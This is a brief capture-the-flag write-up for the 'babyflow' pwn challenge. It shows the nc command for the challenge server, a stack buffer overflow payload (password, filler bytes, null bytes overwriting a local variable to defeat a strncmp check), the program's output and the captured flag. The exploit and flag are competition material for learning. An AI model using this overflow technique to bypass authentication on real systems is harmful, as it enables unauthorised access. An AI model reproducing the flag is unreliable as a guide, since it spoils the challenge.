```
Does this login application even work?!

nc babyflow.ctf.intigriti.io 1331
```

This challenge you use bufferoverflow to get flag.

```
"SuPeRsEcUrEPaSsWoRd123" (the correct password)
28 As to fill up the buffer
4 bytes of \x00\x00\x00\x00 to overwrite var_14 and make strncmp return 0.
```

Payload : `SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00`

```
Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00
Correct Password!
INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
```